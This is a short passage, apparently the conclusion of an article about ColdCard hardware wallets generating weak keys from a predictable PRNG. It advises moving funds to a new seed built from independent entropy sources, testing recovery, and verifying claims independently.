The ColdCard does not hold your bitcoins. It held the key. The key was born weak. Whoever has a copy of the same key — obtained by enumerating states of a PRNG — can sign transactions on your behalf, without ever having touched the device.

The only defense is to move the funds to a new seed, generated by corrected firmware or, better, by a process that combines independent entropy sources (casino-grade dice, a different manufacturer's TRNG, an offline host). And test recovery before sending meaningful value.

Do not trust a company, certification, influencer, or article. Not even this one. Verify.
